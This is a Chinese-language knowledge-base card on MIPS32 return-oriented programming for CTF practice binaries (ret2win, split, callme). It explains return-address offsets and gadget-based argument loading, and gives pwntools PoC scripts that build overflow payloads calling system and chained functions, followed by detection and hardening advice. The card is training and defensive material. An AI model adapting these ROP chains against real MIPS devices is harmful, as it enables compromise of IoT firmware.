---
id: binary-pwn-rop-mips32-stack-frame-gadget-args
title: MIPS32 ROP 基础：fp+4 返回地址定位、t9/ra 跳转与 s0-s7 参数 gadget（ret2win/split/callme）
type: scenario
domain: binary
path: binary/pwn/rop
technique: mips32-rop-stack-frame-gadget-args
tags:
- mips
- mipsel
- rop
- stack-overflow
- gadget
- calling-convention
- ret2text
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T06:40:10+08:00'
  notes: 已对照原文1075-1530行核对：fp+4返回地址、0x24偏移、lw a0,8(sp)/lw t9,4(sp)/jalr t9(gadget 0x400A20)、callme gadget 0x400BB0的0x10/0xC/8/4取参与0x14下一跳+addi sp,0x18均与原文一致；PoC寄存器排布与原文exp逐项一致；dedup候选为同组不同技术卡
url: /docs/binary/pwn/rop/binary-pwn-rop-mips32-stack-frame-gadget-args/
draft: false
kb_aliases:
- MIPS ROP 基础
- MIPS ret2win
- MIPS split
- MIPS callme
- mipsrop
- fp+4 返回地址
- t9 ra 跳转
- move a0 s0
---

## 一句话结论

MIPS32 的调用/返回不靠 `call/ret` 指令，而由函数序言把 `$ra`/`$fp` 存到栈、尾声再从栈取回并 `jr $ra`，所以栈溢出时返回地址位于 `缓冲区到 $fp 的距离 + 4`（通常缓冲区在 `fp-0x20`，故偏移 0x24）；ROP 链用 `$t9` 控制调用目标、用 `$s0-$s7` 经 `move $a0,$s0` 一类 gadget 控制参数，常见的万能 gadget `lw $a0,8($sp); lw $t9,4($sp); jalr $t9` 可直接执行栈上指定的函数并传参，ret2win/split/callme 都是这一模式的直接应用。

## 原理

- **MIPS32 特点**：固定 4 字节指令、分支/跳转后有延迟槽、32 个通用寄存器、只有 load/store 访问内存；很多 MIPS 固件/CTF 程序没有 ASLR/PIE，部分没有 NX，栈可直接执行。小端（mipsel）与大端（mipseb）都常见，`p32` 打包时要注意端序。
- **寄存器约定**：`$a0-$a3`（`$4-$7`）是前四个参数，`$v0-$v1`（`$2-$3`）是返回值，`$t0-$t9` 是临时/调用目标，`$s0-$s7`（`$16-$23`）是被调用者保存寄存器，`$ra`（`$31`）是返回地址，`$sp`（`$29`）是栈指针，`$fp`（`$30`）可选作帧指针。
- **栈帧与返回地址**：典型序言 `addiu $sp,-0x40; sw $ra,0x38+var_s4($sp); sw $fp,0x38+var_s0($sp); move $fp,$sp`，把 `$fp` 存在 `fp+0`、`$ra` 存在 `fp+4`；尾声 `move $sp,$fp; lw $ra,...; lw $fp,...; addiu $sp,...; jr $ra` 恢复。若缓冲区在 `fp-0x20`，则溢出到 `$ra` 需要 `0x20+4=0x24` 字节（原文 ret2win/split 等题一致）。
- **为什么 ROP 可行**：`$ra` 从栈上取回后 `jr $ra`，覆盖栈上的 `$ra` 即可跳到任意地址；`$t9` 常用于间接调用（`la $v0,func; move $t9,$v0; jalr $t9`），所以 ROP 中常用 `jr $t9`/`jalr $t9` 作为“调用下一跳”；`$s0-$s7` 从栈恢复，配合 `move $a0,$s0` 等指令控制参数。
- **gadget 搜索**：IDA 插件 mipsrop，常用 `mipsrop.find("move $v0")`、`mipsrop.find("lw $ra")`、`mipsrop.find("jr $t9")`、`mipsrop.find("jalr $t9")`；重点找 `lw $a0,off($sp)`、`lw $a1,off($sp)`、`lw $a2,off($sp)`、`lw $t9,off($sp)`、`move $a0,$s0`。
- **三种基础题型**：
  - ret2win：程序里有直接 `system("/bin/cat flag.txt")` 的函数，覆盖 `$ra` 即可。
  - split：没有 win 函数，但给了 `lw $a0,8($sp); lw $t9,4($sp); jalr $t9` gadget 和 `/bin/cat flag.txt` 字符串；用 gadget 把字符串地址放进 `$a0`、`system` 地址放进 `$t9`。
  - callme：需要用同一 gadget 连续调用 `callme_one/two/three`，每次参数为 `0xdeadbeef,0xcafebabe,0xd00df00d`；gadget 从栈上 `0x10/0xC/8/4` 取 `$a0/$a1/$a2/$t9`，调用后从 `0x14($sp)` 取下一跳并 `addi $sp,0x18`，因此可以把“参数块 + 下一个 gadget”连续排布。

## 触发条件

- 目标为 MIPS32（mipsel/mipseb）用户态程序，存在栈缓冲区溢出，能覆盖保存的 `$ra`/`$fp`。
- 无 canary 或可泄露/绕过；无 PIE 时地址固定；NX 关闭或可用 ROP 调 `system`/`execve`。
- 能静态定位 gadget（mipsrop/ROPgadget/objdump）与目标函数/字符串地址；知道端序以正确打包。
- 程序有可用的 `system`/`execve` 或 syscall gadget，或能通过 GOT/库偏移计算。

## 利用步骤

1. 用 `file`/`checksec` 确认架构、端序、PIE/NX/canary；用 IDA 看溢出函数序言/尾声，按 `缓冲区到 $fp 距离 + 4` 算返回地址偏移（ret2win 题为 `0x20+4=0x24`）。
2. 找目标：win 函数地址，或 `system` 的 PLT/GOT/库地址，或 syscall gadget。
3. 用 mipsrop 找参数/调用 gadget：`lw $a0,off($sp); lw $t9,off($sp); jalr $t9`；需要多参数时找连续 `lw $a0/$a1/$a2/$t9` 的 gadget。
4. 按端序用 pwntools `p32` 打包；payload = `cyclic(offset) + p32(第一跳) + 参数/下一跳`。MIPS 的 `jalr` 有延迟槽，gadget 末尾通常有 `nop`/`addi $sp` 调整，布局要按反汇编逐字对齐。
5. ret2win：`payload = cyclic(0x24) + p32(win)`。
6. split：`payload = cyclic(0x24) + p32(gadget) + p32(0xdeadbeef) + p32(system) + p32(str_catflag)`（gadget 从 `sp+8` 取 `$a0`、`sp+4` 取 `$t9`）。
7. callme：按 `gadget` 的偏移排布 `[dummy, callmeN, a2, a1, a0, 下一 gadget]`，连续三次调用 `callme_one/two/three`；每次参数 `0xdeadbeef/0xcafebabe/0xd00df00d`。
8. 发送 payload，观察 `system`/`print_file` 输出或交互 shell。

## PoC

```python
from pwn import *
context.binary = elf = ELF('./ret2win_mipsel')
win = 0x0400A00
payload = cyclic(0x24) + p32(win)
# io.sendlineafter(b'> ', payload)
```

```python
# split：gadget = lw a0,8(sp); lw t9,4(sp); jalr t9
a0_t9 = 0x0400A20
str_catflag = 0x0411010
payload = cyclic(0x24) + p32(a0_t9) + p32(0xdeadbeef) + p32(elf.sym.system) + p32(str_catflag)
```

```python
# callme：gadget = lw a0,0x10(sp); lw a1,0xC(sp); lw a2,8(sp); lw t9,4(sp);
#                    jalr t9; nop; lw ra,0x14(sp); jr ra; addi sp,0x18
useful = 0x00400BB0
callme1, callme2, callme3 = 0x0400D20, 0x0400D80, 0x0400D10
rop = ROP(elf)
for fn in (callme1, callme2, callme3):
    rop.raw(useful)
    rop.raw(0xdead)       # 与 a0 无关的占位
    rop.raw(fn)           # t9
    rop.raw(0xd00df00d)   # a2
    rop.raw(0xcafebabe)   # a1
    rop.raw(0xdeadbeef)   # a0
    rop.raw(useful)       # 下一跳
payload = cyclic(0x24) + rop.chain()
```

## 变体与关联

- **端序变体**：mipseb 用大端 `p32`；同一 gadget 偏移在 EL/EB 版本可能不同，需重新找。
- **延迟槽变体**：`jalr $t9` 后的 `nop`/`move a0,s3` 属于延迟槽，链布局要按实际反汇编，不能按 x86 习惯省略。
- **参数来源变体**：没有 `lw $a0,off($sp)` 时，可用 `move $a0,$s0` 配合 `lw $s0,off($sp)`，或 ret2csu（见 [[binary-pwn-rop-mips-ret2csu-libc-csu-init]]）。
- **关联**：现有 MIPS 实网卡 [[binary-pwn-stack-mips-hedwig-cgi-uid-rop]]、[[binary-pwn-stack-dir505-my-cgi-content-length-overflow-mipseb-rop]] 是同一套 MIPS ROP 机制在 IoT CGI 上的应用；栈迁移/GOT 泄露见 [[binary-pwn-rop-mips-pivot-got-libpivot-ret2win]]；MIPS SROP 见 [[binary-pwn-stack-mips-srop-sigreturn-bss-execve]]。

## 检测与防御

- **检测**：MIPS 程序出现 `read`/`strcpy`/`sprintf` 等不限长写入到栈缓冲区、且序言保存 `$ra`；二进制中大量 `lw $a0/$t9,off($sp); jalr $t9` gadget；运行时 `$ra` 指向非代码段/栈地址。
- **防御**：启用 canary、PIE/ASLR、NX；编译时加栈保护；对 MIPS 固件减少 `system` 与固定地址 gadget；用 `-fstack-protector-all`、RELRO。
- **响应**：排查异常 `$ra`/`$sp`、栈上的 ROP 链特征与命令字符串；对 IoT 固件做二进制加固。
